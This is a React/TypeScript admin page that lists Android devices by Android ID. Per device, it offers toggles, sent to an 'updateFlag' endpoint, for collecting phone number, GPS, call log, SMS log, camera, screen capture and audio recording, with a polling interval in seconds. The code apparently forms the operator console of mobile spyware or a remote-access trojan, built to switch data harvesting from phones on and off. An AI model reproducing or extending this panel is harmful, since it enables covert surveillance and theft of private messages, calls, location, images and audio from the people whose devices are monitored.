import ViewProfileInformationForm from "./partials/ViewProfileInformationForm";
import { Head } from "@inertiajs/react";
import { PageProps } from "@/types";
import SidebarMini from "@/layouts/partials/SidebarMini";
import { AppProvider } from "@/contexts/app-context";
import { useScreenSize } from "@/hooks/use-screen-size";
import axios from "axios";
import { useState } from "react";
import { Link } from "@inertiajs/react";
export default function Edit({
  auth,
  status,
  status_type,
  devices: initialDevices,
}: PageProps<{
  status?: string;
  devices: any[];
  status_type?: string;
}>) {
  const [devices, setDevices] = useState(initialDevices);
  const { width } = useScreenSize();
  const handleChange = async (
    deviceId: string,
    newValue: string,
    target: string,
  ) => {
    try {
      const response = await axios.post(route("updateFlag"), {
        id: deviceId,
        value: newValue,
        target: target,
      });
      if (response.data.devices) {
        setDevices(response.data.devices);
      } else {
        // Update only the modified device in the state
        setDevices((prevDevices) =>
          prevDevices.map((device) =>
            device.id === deviceId ? { ...device, [target]: newValue } : device,
          ),
        );
      }
      console.log("Update successful");
    } catch (error) {
      console.error("Error updating:", error);
    }
  };
  return (
    <AppProvider>
      <Head title="Flag" />

      <div className="relative overflow-x-auto">
        <table className="w-full text-left text-sm text-gray-500 dark:text-gray-400 rtl:text-right">
          <thead className="bg-gray-50 text-xs uppercase text-gray-700 dark:bg-gray-700 dark:text-gray-400">
            <tr>
              <th scope="col" className="px-6 py-3">
                Android ID
              </th>
              <th scope="col" className="px-6 py-3">
                Version
              </th>
              <th scope="col" className="px-6 py-3">
                Model
              </th>
              <th scope="col" className="px-6 py-3">
                Timing
              </th>
              <th scope="col" className="px-6 py-3">
                PhoneNumber
              </th>
              <th scope="col" className="px-6 py-3">
                Singal Strength
              </th>
              <th scope="col" className="px-6 py-3">
                GPS
              </th>
              <th scope="col" className="px-6 py-3">
                Call Log
              </th>
              <th scope="col" className="px-6 py-3">
                SMS Log
              </th>
              <th scope="col" className="px-6 py-3">
                Camera
              </th>
              <th scope="col" className="px-6 py-3">
                ScreenCapture
              </th>
              <th scope="col" className="px-6 py-3">
                Audio Record
              </th>
            </tr>
          </thead>
          <tbody>
            {devices.map((device) => {
              return (
                <tr className="border-b border-gray-200 bg-white dark:border-gray-700 dark:bg-gray-800">
                  <td className="px-6 py-4">
                    <Link
                      href={`/admin-pages/${device.android_id}`}
                      className="text-blue-500 underline"
                    >
                      {device.android_id}
                    </Link>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.android_version}
                      onChange={(e) =>
                        handleChange(
                          device.id,
                          e.target.value,
                          "android_version",
                        )
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.model_name}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "model_name")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.timing}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "timing")
                      }
                      className="rounded border p-2"
                    >
                      <option value="10000">10초</option>
                      <option value="20000">20초</option>
                      <option value="30000">30초</option>
                      <option value="40000">40초</option>
                      <option value="50000">50초</option>
                      <option value="60000">60초</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.phone_number}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "phone_number")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.signal_strength}
                      onChange={(e) =>
                        handleChange(
                          device.id,
                          e.target.value,
                          "signal_strength",
                        )
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.gps}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "gps")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.call_log}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "call_log")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.sms_log}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "sms_log")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.camera}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "camera")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.screen_capture}
                      onChange={(e) =>
                        handleChange(
                          device.id,
                          e.target.value,
                          "screen_capture",
                        )
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                  <td className="px-6 py-4">
                    <select
                      value={device.audio_record}
                      onChange={(e) =>
                        handleChange(device.id, e.target.value, "audio_record")
                      }
                      className="rounded border p-2"
                    >
                      <option value="0">0</option>
                      <option value="1">1</option>
                    </select>
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </AppProvider>
  );
}
